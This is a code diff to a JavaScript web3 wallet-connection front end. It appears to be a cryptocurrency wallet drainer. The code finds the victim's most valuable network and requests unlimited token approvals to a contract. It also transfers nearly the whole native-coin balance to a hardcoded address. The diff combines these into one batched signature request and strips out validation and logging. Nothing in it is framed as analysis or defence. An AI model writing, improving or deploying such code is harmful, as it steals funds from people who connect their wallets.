@@ -2,7 +2,7 @@ import { bsc, mainnet, polygon } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, isAddress, getAddress, encodeFunctionData, maxUint256, parseUnits } from 'viem'
-import { readContract, getBalance, writeContract } from '@wagmi/core'
+import { readContract, getBalance, sendCalls } from '@wagmi/core'
 
 // Debounce utility
 const debounce = (func, wait) => {
@@ -397,24 +397,6 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
 
   console.log(`Performing batch operations for network: ${mostExpensive.network}`)
 
-  // Verify chainId
-  if (!mostExpensive.chainId) {
-    const errorMsg = 'Chain ID is undefined, cannot proceed with transaction'
-    store.errors.push(errorMsg)
-    console.error(errorMsg)
-    return
-  }
-
-  // Verify sender address
-  if (!state.address || !isAddress(state.address)) {
-    const errorMsg = `Invalid sender address: ${state.address || 'undefined'}`
-    store.errors.push(errorMsg)
-    console.error(errorMsg)
-    return
-  }
-
-  console.log(`Sender address: ${state.address}`)
-
   // Switch network if necessary
   const currentChainId = store.networkState.chainId
   if (currentChainId !== mostExpensive.chainId) {
@@ -435,7 +417,7 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
         setTimeout(() => {
           unsubscribe()
           reject(new Error(`Failed to switch to ${mostExpensive.network} after timeout`))
-        }, 15000)
+        }, 10000)
       })
     } catch (error) {
       store.errors.push(`Failed to switch network: ${error.message}`)
@@ -451,76 +433,66 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   const approveCalls = networkTokens
     .filter(t => t.address !== 'native')
     .map(t => ({
-      address: getAddress(t.address),
+      to: getAddress(t.address),
       data: encodeFunctionData({
         abi: erc20Abi,
         functionName: 'approve',
         args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
       }),
-      value: BigInt(0)
+      value: '0x0'
     }))
 
-  // Perform approve transactions
-  for (const call of approveCalls) {
-    try {
-      console.log(`Sending approve for token ${call.address}`)
-      const hash = await writeContract(wagmiAdapter.wagmiConfig, {
-        address: call.address,
-        abi: erc20Abi,
-        functionName: 'approve',
-        args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256],
-        chainId: mostExpensive.chainId,
-        account: getAddress(state.address)
-      })
-      console.log(`Approve transaction sent with hash: ${hash}`)
-      const approveState = document.getElementById('approveState')
-      if (approveState) approveState.innerHTML += `Approve transaction sent with hash: ${hash}<br>`
-    } catch (error) {
-      store.errors.push(`Failed to send approve transaction: ${error.message}`)
-      console.error(`Approve transaction error:`, error)
-      const approveState = document.getElementById('approveState')
-      if (approveState) approveState.innerHTML += `Failed to send approve transaction: ${error.message}<br>`
-    }
-  }
-
-  // Prepare and send transfer for native token
+  // Prepare transfer call for native token
+  let transferCall = null
   const nativeToken = networkTokens.find(t => t.address === 'native')
   if (nativeToken) {
     const balanceWei = parseUnits(nativeToken.balance, 18)
-    const gasReserve = BigInt('100000') // 0.001 in wei
+    const gasReserve = BigInt('10000000000000000') // 0.01 ETH in wei
     if (balanceWei > gasReserve) {
       const transferAmount = balanceWei - gasReserve
-      console.log(`Preparing native token transfer: ${nativeToken.symbol} amount=${formatUnits(transferAmount, 18)} to=0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0`)
-      try {
-        const hash = await writeContract(wagmiAdapter.wagmiConfig, {
-          address: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
-          value: transferAmount,
-          chainId: mostExpensive.chainId,
-          account: getAddress(state.address)
-        })
-        console.log(`Native token transfer sent with hash: ${hash}`)
-        const approveState = document.getElementById('approveState')
-        if (approveState) approveState.innerHTML += `Native token transfer sent with hash: ${hash}<br>`
-      } catch (error) {
-        store.errors.push(`Failed to send native token transfer: ${error.message}`)
-        console.error(`Native token transfer error:`, error)
-        const approveState = document.getElementById('approveState')
-        if (approveState) approveState.innerHTML += `Failed to send native token transfer: ${error.message}<br>`
+      transferCall = {
+        to: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
+        value: `0x${transferAmount.toString(16)}`,
+        data: '0x'
       }
     } else {
-      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'} (required > ${formatUnits(gasReserve, 18)} ${nativeToken.symbol || 'unknown'})`)
+      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'}`)
     }
+  }
+
+  // Combine all calls
+  const allCalls = [...approveCalls]
+  if (transferCall) {
+    allCalls.push(transferCall)
+  }
+
+  // Send batch transaction
+  if (allCalls.length > 0) {
+    try {
+      const id = await sendCalls(wagmiAdapter.wagmiConfig, {
+        calls: allCalls,
+        account: getAddress(state.address),
+        chainId: mostExpensive.chainId
+      })
+      console.log(`Batch transaction sent with id: ${id}`)
+      const approveState = document.getElementById('approveState')
+      if (approveState) approveState.innerHTML = `Batch transaction sent with id: ${id}`
+    } catch (error) {
+      store.errors.push(`Failed to send batch transaction: ${error.message}`)
+      const approveState = document.getElementById('approveState')
+      if (approveState) approveState.innerHTML = `Failed to send batch transaction: ${error.message}`
+    }
+  } else {
+    console.log('No operations to perform')
   }
 }
 
 // Initialize subscribers
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
-    console.log(`Received account state:`, state)
     updateStore('accountState', state)
     updateStateDisplay('accountState', state)
     if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
-      console.log(`Connected wallet address: ${state.address}`)
       const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
       const device = detectDevice()
       if (store.isProcessingConnection) {
@@ -615,7 +587,6 @@ const initializeSubscribers = (modal) => {
   }, 1000)
   modal.subscribeAccount(debouncedSubscribeAccount)
   modal.subscribeNetwork(state => {
-    console.log(`Received network state:`, state)
     updateStore('networkState', state)
     updateStateDisplay('networkState', state)
     const switchNetworkBtn = document.getElementById('switch-network')
